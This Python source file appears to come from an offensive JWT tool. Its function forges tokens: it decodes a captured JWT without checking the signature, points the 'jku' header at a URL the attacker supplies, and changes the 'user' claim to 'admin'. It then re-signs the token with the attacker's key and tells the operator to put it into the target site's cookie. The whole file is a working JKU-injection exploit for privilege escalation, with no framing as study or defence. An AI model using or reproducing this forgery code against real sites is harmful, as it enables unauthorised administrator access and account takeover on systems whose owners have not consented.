import jwt as jwtparser
from jwcrypto import jwt
from termcolor import colored


def gen_jwt(token_string, parsed_pem, url):
    headers = {}
    claims = {}

    print(colored('----{ GENERATING NEW JWT }----\n', attrs=["bold"]))

    token_headers = jwtparser.get_unverified_header(token_string)
    for key, val in token_headers.items():
        # replace url.
        if key == "jku":
            val = url
            headers[key] = val
            # ignore "typ" header
        elif key == "typ":
            continue
        else:
            headers[key] = val

    token_payload = jwtparser.decode(token_string, options={"verify_signature": False})
    for key, val in token_payload.items():
        if key == "user":
            val = "admin"
            claims[key] = val
        else:
            claims[key] = val
    new_token = jwt.JWT(header=headers, claims=claims)
    new_token.make_signed_token(parsed_pem)

    print(colored("[+] Here is your new token:", "green"))
    print(new_token.serialize())
    print(colored("Replace old jwt value in cookie with this new token on the target site and refresh web page.\n", "yellow"))




